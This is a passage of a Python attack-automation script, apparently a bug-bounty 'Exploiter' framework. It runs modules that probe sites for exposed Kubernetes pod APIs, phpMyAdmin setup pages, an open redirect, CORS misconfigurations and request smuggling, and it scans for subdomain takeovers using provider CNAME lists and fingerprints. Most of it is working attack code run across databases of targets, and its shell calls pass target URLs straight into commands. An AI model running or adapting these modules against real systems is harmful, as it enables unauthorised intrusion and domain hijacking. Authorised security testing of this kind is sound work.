  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wpmudev-pub-keys
def attMOD299(progScope):
  myKey = "4da7d9cff163918d8ea2dc7091f72287"
  vulnCat = "Disclosures"
  vulnName = "wpmudev-pub-keys"
  severity = "P3"
  vulnDsc = "Wpmudev Dashboard Pub Key"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/wp-content/plugins/wpmudev-updates/keys/']
  redirAllow = False
  statusF = 200
  textF = 'Index of /'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '.pub' in z.text and 'wpmudev' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# wptouch-open-redirect
def attMOD300(progScope):
  myKey = "6cdd607cf667641d8aa973bf3151ac18"
  vulnCat = "OpenRedirect"
  vulnName = "wptouch-open-redirect"
  severity = "P3"
  vulnDsc = "WPTouch Switch Desktop 3.x Open Redirection"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/?wptouch_switch=desktop&redirect=https://example.com/']
  redirAllow = False
  statusF = 302
  textF = 'example.com'
  condition = lambda z : True if( (z.status_code == statusF and z.status_code == 301) and (textF == z.headers['Location']) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# nginx-vhost-traffic-status
def attMOD301(progScope):
  myKey = "8c024d88f9de8a619e9490c13bd2f7cf"
  vulnCat = "Disclosure"
  vulnName = "nginx-vhost-traffic-status"
  severity = "P4"
  vulnDsc = "Nginx Vhost Traffic Status"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/status']
  redirAllow = False
  statusF = 200
  textF = 'Nginx Vhost Traffic Status'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'Host' in z.text and 'Zone' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# kubernetes-metrics
def attMOD302(progScope):
  myKey = "e8e337be8daede8af842cba495cc55ba"
  vulnCat = "Disclosure"
  vulnName = "kubernetes-metrics"
  severity = "P4"
  vulnDsc = "Detect Kubernetes Exposed Metrics"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/metrics']
  redirAllow = False
  statusF = 200
  textF = 'namespace'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'HELP' in z.text and 'TYPE' in z.text and 'kube' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# kubernetes-pods-api
def attMOD303(progScope):
  myKey = "8e9c23999259d3133b7d07bd18d88f86"
  vulnCat = "RCE"
  vulnName = "kubernetes-pods-api"
  severity = "P1"
  vulnDsc = "Kubernetes Pods API"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/pods','/api/v1/pods']
  redirAllow = False
  statusF = 200
  textF = 'apiVersion'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '/api/v1/pods' in z.text and 'selfLink' in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# gitlab-public-repos
def attMOD304(progScope):
  myKey = "645ed9cfc093594b89eada10681c1e31"
  vulnCat = "Disclosure"
  vulnName = "gitlab-public-repos"
  severity = "P4"
  vulnDsc = "GitLab public repositories"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/api/v4/projects']
  redirAllow = False
  statusF = 200
  textF = 'name_with_namespace'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and '_gitlab_session=' in z.headers['Set-Cookie']) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# phpmyadmin-setup
def attMOD305(progScope):
  myKey = "1f48ddf87827b1dcde41fa0afd1ba5b0"
  vulnCat = "Disclosure"
  vulnName = "phpmyadmin-setup"
  severity = "P4"
  vulnDsc = "phpMyAdmin setup page"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/phpmyadmin/setup/index.php']
  redirAllow = False
  statusF = 200
  textF = '<title>phpMyAdmin setup</title>'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# phpmyadmin-misconfiguration
def attMOD306(progScope):
  myKey = "647775976508f91235f189402ec9ad1a"
  vulnCat = "exposure"
  vulnName = "phpmyadmin-misconfiguration"
  severity = "P2"
  vulnDsc = "Sensitive data exposure"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['/phpmyadmin/index.php?db=information_schema','/phpMyAdmin/index.php?db=information_schema']
  redirAllow = False
  statusF = 200
  textF = 'var db    = \'information_schema\';'
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text and 'var opendb_url = \'db_structure.php\';') ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# 
def attMOD(progScope):
  myKey = ""
  vulnCat = ""
  vulnName = ""
  severity = ""
  vulnDsc = ""
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  urlList = ['']
  redirAllow = False
  statusF = 200
  textF = ''
  condition = lambda z : True if( (z.status_code == statusF) and (textF in z.text) ) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)









#*****************CUSTOM ATTACK MODULES*********************#
# subDomTaker accepts all or program name
def subDomTaker(progScope):
  """
    HOW TO TAKE OVERS : 
    1. landingi.com => https://landingi.com/pricing/ - 100 PERCENT VULNERABLE
    2. fastly => https://manage.fastly.com/services/all - it depends
    3. google.com => https://support.google.com/a/answer/9983832 _ NOT VULNERABLE OR EDGE CASE :
      Thank you for your submission! It seems like you used GSuite to claim the domain. For GSuite you will have to verify the domain before it is of any use. For the verification process, you will need to either have access to the DNS of the domain or be able to upload a .html file to prove that you have full control of the domain.
    4. 

  """
  
  """
    agilecrm.com
    Sorry, this page is no longer available.

    airee.ru
    402.

    anima
    If this is your website and you've just created it, try refreshing in a minute

    s3.amazonaws.com
    The specified bucket does not exist

    bitbucket
    Repository not found

    createsend.com
    Trying to access your account?

    cargocollective.com
    404 Not Found

    digitalocean
    Domain uses DO name serves with no records in DO.

    hosted-by-discourse.com
    status_code == 404

    fastly
    Fastly error: unknown domain:

    fly.io
    404 Not Found

    furyns.com
    404: This page could not be found.

    ghost.io
    The thing you were looking for is no longer here, or never was

    github.io or github.com or github.page
    There isn't a GitHub Pages site here.

    hatenablog
    404 Blog is not found

    helpjuice.com
    We could not find what you're looking for.

    helpscoutdocs.com
    No settings were found for this company:

    .herokudns.com, .herokuapp.com, herokussl.com
    No such app

    intercom
    Uh oh. That page doesn't exist.

    myjetbrains.com
    is not a registered InCloud YouTrack

    kinsta.cloud
    No Site For Domain

    landingi.com
    It looks like you’re lost...

    launchrock.com
    It looks like you may have taken a wrong turn somewhere. Don't worry...it happens to all of us.

    mashery.com
    Unrecognized domain

    .azurewebsites.net, .cloudapp.net, .azure-api.net, .trafficmanager.net, .azureedge.net, .cloudapp.azure.com
    404 web site not found.

    netlify.app
    Not found

    ngrok.io
    not found

    .pantheonsite.io
    404 error unknown site!

    pingdom
    Sorry, couldn't find the status page

    readme
    Project doesnt exist... yet!

    myshopify
    Sorry, this shop is currently unavailable.

    smartjobboard
    This job board website is either expired or its domain name is invalid.

    smartling.com
    Domain is not configured

    strikinglydns
    page not found

    surge.sh
    project not found

    tumblr.com
    Whatever you were looking for doesn't currently exist at this address

    tilda.cc
    Please renew your subscription

    uberflip.com
    Non-hub domain, The URL you've accessed does not provide a hub.

    uptimerobot
    page not found

    uservoice.com
    This UserVoice subdomain is currently available!

    webflow.com
    The page you are looking for doesn't exist or has been moved.

    wordpress.com
    Do you want to register *.wordpress.com?

    worksites
    Hello! Sorry, but the website you
  """
  cnamePotentials = [
    '.herokudns.com','.herokuapp.com','.herokussl.com','.azurewebsites.net','.cloudapp.net','.azure-api.net','.trafficmanager.net','.azureedge.net','.cloudapp.azure.com','.cloudfront.net','.s3.amazonaws.com','.awsptr.com','.elasticbeanstalk.com','.uservoice.com','.unbouncepages.com','.ghs.google.com','.ghs.googlehosted.com','.ghs-ssl.googlehosted.com','.github.io','.www.gitbooks.io','.sendgrid.net','.feedpress.me','.fastly.net','.webflow.io','.proxy.webflow.com','.helpscoutdocs.com','.readmessl.com','.desk.com','.zendesk.com','.mktoweb.com','.wordpress.com','.wpengine.com','.cloudflare.net','.netlify.com','.bydiscourse.com','.netdna-cdn.com','.pageserve.co','.pantheonsite.io','.arlo.co','.apigee.net','.pmail5.com','.cm-hosting.com','.ext-cust.squarespace.com','.ext.squarespace.com','.www.squarespace6.com','.locationinsight.com','.helpsite.io','.saas.moonami.com','.custom.bnc.lt','.qualtrics.com','.dotcmscloud.net','.dotcmscloud.com','.knowledgeowl.com','.atlashost.eu','.headwayapp.co','.domain.pixieset.com','.cname.bitly.com','.awmdm.com','.meteor.com','.postaffiliatepro.com','.na.iso.postaffiliatepro.com','.copiny.com','.kxcdn.com','.phs.getpostman.com','.appdirect.com','.streamshark.io','.ethosce.com','.custhelp.com','.onelink-translations.com','.mashery.com','.edgesuite.net','.akadns.net','.edgekey.net','.akamaiedge.net','.edgekey-staging.net','.lldns.net','.edgecastcdn.net','.centercode.com','.jivesoftware.com','.cvent.com','.covisint.com','.digitalrivercontent.net','.akahost.net','.connectedcommunity.org','.lithium.com','.sl.smartling.com','.pfsweb.com','.bsd.net','.vovici.net','.extole.com','.ent-sessionm.com','.eloqua.com','.inscname.net','.insnw.net','.2o7.net','.wnmh.net','.footprint.net','.llnwd.net','.cust.socrata.net','.scrool.se','.phenompeople.com','.investis.com','.skilljar.com','.imomentous.com','.cleverbridge.com','.insnw.net','.sailthru.com','.static.captora.com','.q4web.com','.omtrdc.net','.devzing.com','.pphosted.com','.securepromotion.com','.getbynder.com','.certain.com','.certainaws.com','.eds.com','.bluetie.com','.relayware.com','.yodlee.com','.mrooms.net','.ssl.cdntwrk.com','.secure.gooddata.com','.deltacdn.net','.happyfox.com','.proformaprostores.com','.yext-cdn.com','.edgecastdns.net','.ecdns.net'
    ]

  # REMOVED FASTLY FROM HERE AND WE HAVE A SEPERATE MODULE FOR THAT
  #     'fastly.net':'Fastly error: unknown domain:',
  # Starts here
  # vulnSigns = {
    #   'agilecrm':'Sorry, this page is no longer available.',
    #   'activehosted':'alt="LIGHTTPD - fly light."',
    #   'aftership':'Oops.</h2><p class="text-muted text-tight">The page you\'re looking for doesn\'t',
    #   'aha.io':'There is no portal here ... sending you back to Aha!',
    #   'airee.com':'LaterADD',
    #   'datocms':'<!doctype html><html><head><meta charset="utf-8"><title>Loading...',
    #   '-portal.apigee.net':'',
    #   'bigcartel':'<h1>Oops! We could&#8217;t find that page.</h1>',
    #   'bcvp0rtal':'<p class="bc-gallery-error-code">Error Code: 404</p>',
    #   'canny':'There is no such company. Did you enter the right URL?',
    #   'name.createsend.com':'Double check the URL or <a href="mailto:help@createsend.com',
    #   'subdomain.cargocollective.com':'404 Not Found',
    #   'cloudfront':'Bad Request: ERROR: The request could not be satisfied',
    #   'desk.com':'Please try again or try Desk.com free for 14 days.',
    #   'elasticbeanstalk.com':'',
    #   'feedpress':'The feed has not been found.',
    #   'freshdesk':'May be this is still fresh!',
    #   'frontify':'404 - Page Not Found</h1>',
    #   'gr8':'With GetResponse Landing Pages, lead generation has never been easier',
    #   'helprace':'Admin of this Helprace account needs to set up domain alias',
    #   'hubspot':'Domain Not found',
    #   'pageserve':'You\'ve Discovered A Missing Link. Our Apologies!',
    #   'instapage':'You\'ve Discovered A Missing Link. Our Apologies!',
    #   'mykajabi':'<h1>The page you were looking for doesn\'t exist.</h1>',
    #   'leadpages':'Double check that you have the right web address and give it another go!</p>',
    #   'proposify':'If you need immediate assistance, please contact <a href="mailto:support@proposify.biz',
    #   'readthedocs':'is unknown to Read the Docs',
    #   'simplebooklet':'We can\'t find this <a href="https://simplebooklet.com',
    #   'domains.smugmug.com':'',
    #   'statuspage':'You are being <a href="https://www.statuspage.io">redirected',
    #   'sgizmo.com':'data-html-name',
    #   'surveygizmo.eu':'data-html-name',
    #   'sgizmoca.com':'data-html-name',
    #   'tave.com':'<h1>Error 404: Page Not Found</h1>',
    #   'teamwork':'Oops - We didn\'t find your site.',
    #   'thinkific':'You may have mistyped the address or the page may have moved.',
    #   'tictail':'to target URL: <a href="https://tictail.com',
    #   'unbouncepages':'The requested URL was not found on this server',
    #   'vendecommerce':'Looks like you\'ve traveled too far into cyberspace',
    #   'wishpond':'https://www.wishpond.com/404?campaign=tru',
    #   'acquia':'The site you are looking for could not be found.',
    #   'airee':'402.',
    #   'aws':'The specified bucket does not exist',
    #   'bitbucket':'Repository not found',
    #   'createsend.com':'Double check the URL or <a href="mailto:help@createsend.com',
    #   'cargocollective.com':'If you\'re moving your domain away from Cargo you must',
    #   'digitalocean':'Domain uses DO name serves',
    #   'discourse':'not found',
    #   'fly.io':'404 Not Found',
    #   'furyns':'404: This page could not be found.',
    #   'ghost':'The thing you were looking for is no longer here, or never was',
    #   'github.io':'There isn\'t a GitHub Pages site here',
    #   'hatenablog':'404 Blog is not found',
    #   'helpjuice':'We could not find what you',
    #   'helpscoutdocs':'No settings were found for this company:',
    #   'herokudns':'No such app',
    #   'herokuapp':'No such app',
    #   'herokussl':'No such app',
    #   'intercom':'<h1 class="headline"Uh oh. That page doesn\'t exist.</h1>',
    #   'jetbrains':'is not a registered InCloud YouTrack',
    #   'kinsta':'No Site For Domain',
    #   'landingi':'It looks like you’re lost...',
    #   'launchrock':'It looks like you may have taken a wrong turn somewhere',
    #   'mashery':'Unrecognized domain',
    #   'azure':'404 web site not found.',
    #   'cloudapp':'404 web site not found.',
    #   'trafficmanager':'404 web site not found.',
    #   'windows.net':'404 web site not found.',
    #   'visualstudio.com':'404 web site not found.',
    #   'netlify':'Not found - Request ID:',
    #   'ngrok.io':'ngrok.io not found',
    #   'pantheonsite':'The gods are wise, but do not know of the site which you seek.',
    #   'pingdom':'This public report page has not been activated by the user',
    #   'readme':'Project doesnt exist... yet!',
    #   'myshopify.com':'Sorry, this shop is currently unavailabl',
    #   'smartjobboard':'This job board website is either expired or its domain name is invalid',
    #   'smartling':'Domain is not configured',
    #   'strikinglydns':'But if you\'re looking to build your own website,',
    #   'surge.sh':'project not found',
    #   'tumblr':'Whatever you were looking for doesn\'t currently exist at this address',
    #   'tilda.cc':'Please renew your subscription',
    #   'uberflip':'Non-hub domain, The URL you\'ve accessed does not provide a hub. Please check',
    #   'uptimerobot':'This public status page <b>does not seem to exist</b>.',
    #   'uservoice':'This UserVoice subdomain is currently available!',
    #   'webflow':'The page you are looking for doesn',
    #   'wordpress.com':'Do you want to register',
    #   'worksites':'Hello! Sorry, but the website you',
    #   'google.com':'The requested URL was not found on this server',
    #   'vercel':'The deployment could not be found on Vercel.',
    #   'announcekit':'Error 404 - AnnounceKit',
    #   'brightcove':'Error Code: 404</p>',
    #   'campaignmonitor':'mailto:help@createsend.com',
    #   'flexbe':'Domain isn\'t configured',
    #   'flywheel':'We\'re sorry, you\'ve landed on a page that is hosted by Flywheel',
    #   'gemfury':'404: This page could not be found.',
    #   'jazzhr':'This account no longer active',
    #   'pagewiz':'404 - Page Not Found',
    #   'sprintful':'The user account associated with this calendar has been deactivated.'
  #   }
  vulnSigns = {
    'amazonaws':'The specified bucket does not exist',
    'agilecrm':'this page is no',
    'landingi':'It looks like you',
    'activehosted':'fly light',
    'aftership':'re looking for doesn',
    'aha.io':'There is no portal',
    'airee.com':'LaterADD',
    'datocms':'Loading',
    '-portal.apigee.net':'',
    'bigcartel':'find that page',
    'bcvp0rtal':'Error Code</p>',
    'canny':'enter the right URL?',
    'createsend':'Double check',
    'cargocollective':'404 Not Found',
    'cloudfront':'Bad Request',
    'desk.com':'Please try again',
    'elasticbeanstalk.com':'',
    'feedpress':'The feed has not',
    'freshdesk':'May be this',
    'frontify':'404 - Page',
    'gr8':'never been easier',
    'helprace':'set up domain alias',
    'hubspot':'Domain Not found',
    'pageserve':'A Missing Link',
    'instapage':'A Missing Link',
    'mykajabi':'were looking for doesn',
    'leadpages':'give it another go',
    'proposify':'support@proposify.biz',
    'readthedocs':'is unknown to Read the Docs',
    'simplebooklet':'https://simplebooklet.com',
    'domains.smugmug.com':'',
    'statuspage':'https://www.statuspage.io',
    'sgizmo.com':'data-html-name',
    'surveygizmo.eu':'data-html-name',
    'sgizmoca.com':'data-html-name',
    'tave.com':'Error 404',
    'teamwork':'Oops - We didn',
    'thinkific':'You may have mistyped',
    'tictail':'https://tictail.com',
    'unbouncepages':'The requested URL was not found',
    'vendecommerce':'traveled too far into cyberspace',
    'wishpond':'wishpond.com/404',
    'acquia':'could not be found.',
    'airee':'402.',
    'aws':'bucket does not exist',
    'bitbucket':'Repository not found',
    'createsend':'help@createsend.com',
    'cargocollective':'domain away from Cargo you must',
    'digitalocean':'Domain uses DO name serves',
    'discourse':'not found',
    'fly.io':'404 Not Found',
    'furyns':'404: This page could not be found.',
    'ghost':'looking for is no longer here',
    'github.io':'t a GitHub Pages site here',
    'hatenablog':'404 Blog',
    'helpjuice':'We could not',
    'helpscoutdocs':'No settings were found',
    'herokudns':'No such app',
    'herokuapp':'No such app',
    'herokussl':'No such app',
    'intercom':'Uh oh. That page doesn',
    'jetbrains':'is not a registered',
    'kinsta':'No Site For Domain',
    'launchrock':'wrong turn somewhere',
    'mashery':'Unrecognized',
    'azure':'site not found.',
    'cloudapp':'site not found.',
    'trafficmanager':'site not found.',
    'windows.net':'site not found.',
    'visualstudio.com':'site not found.',
    'netlify':'Not found',
    'ngrok.io':'ngrok.io',
    'pantheonsite':'site which you seek.',
    'pingdom':'not been activated by the user',
    'readme':'doesnt exist',
    'myshopify.com':'shop is currently unavailabl',
    'smartjobboard':'domain name is invalid',
    'smartling':'Domain is not configured',
    'strikinglydns':'build your own website,',
    'surge.sh':'project not found',
    'tumblr':'exist at this address',
    'tilda.cc':'Please renew your subscription',
    'uberflip':'Please check',
    'uptimerobot':'does not seem to exist',
    'uservoice':'currently available!',
    'webflow':'The page you are looking for doesn',
    'wordpress.com':'Do you want to register',
    'worksites':'but the website you',
    'google.com':'not found on this server',
    'vercel':'not be found on Vercel.',
    'announcekit':'Error 404',
    'brightcove':'Error Code',
    'campaignmonitor':'createsend.com',
    'flexbe':'configured',
    'flywheel':'page that is hosted',
    'gemfury':'This page could not be found.',
    'jazzhr':'This account no longer active',
    'pagewiz':'Page Not Found',
    'sprintful':'been deactivated.'
    }
  
  myKey = "267c8b9c39b12decf5c060a2afc650ff"
  vulnCat = "Subdomain Takeover"
  vulnName = "subDomTaker"
  severity = "P2/P3"
  vulnDsc = "Subdomain takeover => leads to XSS ,others."
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  candidateURI = '/'
  prog = progScope
  
  if prog == "":
    exit()
  elif prog == "exit":
    return False
  elif prog == "all":
    programs = listdir(dbPath)
    random.shuffle(programs)
    bar = IncrementalBar('Exploiter.py => subDomTaker()', max=len(programs))
    for progName in programs:
      try:
        conn = dbConnect(progName)
        cur = conn.cursor()
        cur.execute(f'''
                    SELECT targetURI,progAdr
                    FROM TARGETS where keyID IS NULL OR keyID not like "%{myKey}%"
                    ORDER BY RANDOM() limit 85
                    ''')
        results = cur.fetchall()
        dbDisconnect(conn)
        
        if len(results) != 0:
          bar2 = IncrementalBar('Exploiter.py => subDomTaker()', max=len(results))
          for item in results:
            progAdr = item[1]
            targetURI = item[0]

            # turn https://google.com:8443 => google.com
            candidate = (targetURI.rsplit('//')[1]).rsplit(':')[0]

            try:
              result = dns.resolver.resolve(candidate, 'CNAME')
              if len(result) != 0:
                # extract the cname
                # nsRecord = str(result.chaining_result.answer).rsplit(' ')[4]
                nsRecord = ((str(result.response.answer).rsplit('<')[2]).rsplit('>')[0]).rstrip('.')

                # Let's check if potential sub takeover possible
                match = next((res for ns,res in vulnSigns.items() if ns in nsRecord), None)
                if match: # if match was not None, if we found something, match = res
                  print(f"Found potential??? CNAME : {candidate} => {nsRecord}")
                  fullURLTxt = str(targetURI)
                  headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
                  r = requests.get(url=fullURLTxt,headers=headers,allow_redirects=True,verify=False,timeout=8)
                  
                  # Let's confirm 100 Percent
                  if str(match).lower() in str(r.text).lower():
                    print(f"Found Vunerable!!! : {candidate} => {nsRecord}")
                    vulnPath = fullURLTxt
                    fullPayload = r.text[:7000]
                    vulnDsc = f"CNAME : {candidate} => {nsRecord}"
                    
                    inserToVULNS(progName,progAdr,targetURI,fullURLTxt,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload)
                    
                    screamBugs(f"-------------------------------------\n$$$$$ CONGRATS TUPI $$$$$\n=========================\nprogName: {progName}\nprogAdr: {progAdr}\ntargetURI: {targetURI}\nfullURLTxt: {fullURLTxt}\nvulnCat: {vulnCat}\nvulnName: {vulnName}\nseverity: {severity}\nvulnDsc: {vulnDsc}\nvulnPath: {vulnPath}\n-------------------------------------")
                      
              updateTargetDC(progName,progAdr,targetURI,myKey)
            # except Exception as e:
            #   print(f"EXCEPTION: {e}")
            except:
              # updateTargetDC(progName,progAdr,targetURI,myKey)
              pass
                                    
            bar2.next()
          bar2.finish()
      # except Exception as e:
      #   print(f"EXCEPTION: {e}")
      except:
        pass
      bar.next()
    bar.finish()
  else:
    try:
      progName = prog
      conn = dbConnect(progName)
      cur = conn.cursor()
      cur.execute(f'''
                  SELECT targetURI,progAdr
                  FROM TARGETS where keyID IS NULL OR keyID not like "%{myKey}%"
                  ORDER BY RANDOM() limit 85
                  ''')

      results = cur.fetchall()
      dbDisconnect(conn)
      
      if len(results) != 0:
        bar = IncrementalBar('Exploiter.py => subDomTaker()', max=len(results))
        for item in results:
          progAdr = item[1]
          targetURI = item[0]

          # turn https://google.com:8443 => google.com
          candidate = (targetURI.rsplit('//')[1]).rsplit(':')[0]
          try:
            result = dns.resolver.resolve(candidate, 'CNAME')
            if len(result) != 0:
              # nsRecord = str(result.chaining_result.answer).rsplit(' ')[4]
              nsRecord = ((str(result.response.answer).rsplit('<')[2]).rsplit('>')[0]).rstrip('.')

              # Let's check for potential takeover 
              match = next((res for ns,res in vulnSigns.items() if ns in nsRecord), None)
              if match: # if match was not None, if we found something, match = res
                print(f"Found potential??? CNAME : {candidate} => {nsRecord}")
                fullURLTxt = str(targetURI)
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
                r = requests.get(url=fullURLTxt,headers=headers,allow_redirects=True,verify=False,timeout=8)
                
                # Let's confirm 100 Percent                
                if str(match).lower() in str(r.text).lower():
                  print(f"Found Vunerable!!! : {candidate} => {nsRecord}")
                  vulnPath = fullURLTxt
                  fullPayload = r.text[:7000]
                  vulnDsc = f"CNAME : {candidate} => {nsRecord}"
                  
                  inserToVULNS(progName,progAdr,targetURI,fullURLTxt,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload)
                  
                  screamBugs(f"-------------------------------------\n$$$$$ CONGRATS TUPI $$$$$\n=========================\nprogName: {progName}\nprogAdr: {progAdr}\ntargetURI: {targetURI}\nfullURLTxt: {fullURLTxt}\nvulnCat: {vulnCat}\nvulnName: {vulnName}\nseverity: {severity}\nvulnDsc: {vulnDsc}\nvulnPath: {vulnPath}\n-------------------------------------")
                    
            updateTargetDC(progName,progAdr,targetURI,myKey)
          # except Exception as e:
          #   print(f"EXCEPTION: {e}")
          except:
            # updateTargetDC(progName,progAdr,targetURI,myKey)
            pass
          bar.next()
        bar.finish()
    # except Exception as e:
    #   print(f"EXCEPTION: {e}")
    except:
      pass

# CORS MISCONFIG
def corsPloiter(progScope):
  myKey = "5761380990a51fcc45b20696d8154522"
  vulnCat = "PII-Access"
  vulnName = "corsPloiter"
  severity = "P1"
  vulnDsc = "Find potential and actionable cors misconfigurations"
  vulnPath = ""
  fullPayload = ""
  customHeaders = {'Origin': 'https://tupi.com'}
  reqMethod = ""
  postData = ""
  urlList = ['/']
  # urlList = ['/accountDetails']
  redirAllow = False
  statusF = 200
  textF = 'https://tupi.com'
  textG = '*'
  
  condition = lambda z : True if( (z.status_code == statusF) and ((z.headers['Access-Control-Allow-Origin'] == textG or z.headers['Access-Control-Allow-Origin'] == textF ) and (z.headers['Access-Control-Allow-Credentials'] == 'true') )) else False
  # condition = lambda z : True if( ((z.headers['Access-Control-Allow-Origin'] == textG or z.headers['Access-Control-Allow-Origin'] == textF ) and (z.headers['Access-Control-Allow-Credentials'] == 'true') )) else False
  
  targetAttackLauncher(myKey,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload,progScope,urlList,redirAllow,condition,customHeaders,reqMethod,postData)

# This module smuggz the target and extracts injected payloads
def smuggZ(progScope):
  myKey = "88693f84d06e152932e89c0bf2848e70"
  vulnCat = "DESYNC ATTACK (Smuggling)"
  vulnName = "smuggZ"
  severity = "P1/P2"
  vulnDsc = "smuggZ => Arbitrary req/res to victims"
  vulnPath = ""
  fullPayload = ""
  customHeaders = ""
  reqMethod = ""
  postData = ""
  candidateURI = '/'
  prog = progScope

  if prog == "":
    exit()
  elif prog == "exit":
    return False
  elif prog == "all":
    programs = listdir(dbPath)
    random.shuffle(programs)
    bar = IncrementalBar(f'Exploiter.py => {vulnName}()', max=len(programs))
    for progName in programs:
      try:
        conn = dbConnect(progName)
        cur = conn.cursor()
        cur.execute(f'''
                    SELECT targetURI,progAdr
                    FROM TARGETS where keyID IS NULL OR keyID not like "%{myKey}%"
                    ORDER BY RANDOM() limit 1
                    ''')
        results = cur.fetchall()
        dbDisconnect(conn)
        
        if len(results) != 0:
          bar2 = IncrementalBar(f'Exploiter.py => {vulnName}()', max=len(results))
          for item in results:
            progAdr = item[1]
            targetURI = item[0]

            try:
              fullURLTxt = targetURI
              # headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
              
              # generate filename to store smuggz
              fileNAME = random.random()
              # execute smuggler to fuzz what is smuggable
              getoutput(f"python3 /opt/smuggler/smuggler.py -u {fullURLTxt} --method POST -q -l /tmp/{fileNAME}")
              # check if the smuggling was done and we have results
              smuggResults = getoutput(f"cat /tmp/{fileNAME} | grep CRITICAL")
              getoutput(f"rm -f /tmp/{fileNAME}")  
              
              if len(smuggResults) > 0:
                vulnPath = fullURLTxt
                fullPayload = smuggResults
                print(f"Found Vunerable!!! : {vulnPath}")
                inserToVULNS(progName,progAdr,targetURI,fullURLTxt,vulnCat,vulnName,severity,vulnDsc,vulnPath,fullPayload)
                
                screamBugs(f"-------------------------------------\n$$$$$ CONGRATS TUPI $$$$$\n=========================\nprogName: {progName}\nprogAdr: {progAdr}\ntargetURI: {targetURI}\nfullURLTxt: {fullURLTxt}\nvulnCat: {vulnCat}\nvulnName: {vulnName}\nseverity: {severity}\nvulnDsc: {vulnDsc}\nvulnPath: {vulnPath}\n-------------------------------------")
                
              updateTargetDC(progName,progAdr,targetURI,myKey)
            except Exception as e:
              print(f"EXCEPTION: {e}")
            except:
              # updateTargetDC(progName,progAdr,targetURI,myKey)
              pass
                                    
            bar2.next()
          bar2.finish()
      except Exception as e:
        print(f"EXCEPTION: {e}")
      except:
        pass
      bar.next()
    bar.finish()
  else:
    progName = prog
    try:
      conn = dbConnect(progName)
      cur = conn.cursor()
      cur.execute(f'''
                  SELECT targetURI,progAdr
                  FROM TARGETS where keyID IS NULL OR keyID not like "%{myKey}%"
                  ORDER BY RANDOM() limit 1
                  ''')
      results = cur.fetchall()
      dbDisconnect(conn)
      
      if len(results) != 0:
        bar = IncrementalBar(f'Exploiter.py => {vulnName}()', max=len(results))
        for item in results:
          progAdr = item[1]
          targetURI = item[0]

          try:
            fullURLTxt = targetURI
            # headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36'}
            
            # generate filename to store smuggz
            fileNAME = random.random()
            # execute smuggler to fuzz what is smuggable
            getoutput(f"python3 /opt/smuggler/smuggler.py -u {fullURLTxt} --method POST -q -l /tmp/{fileNAME}")
            # check if the smuggling was done and we have results
            smuggResults = getoutput(f"cat /tmp/{fileNAME} | grep CRITICAL")
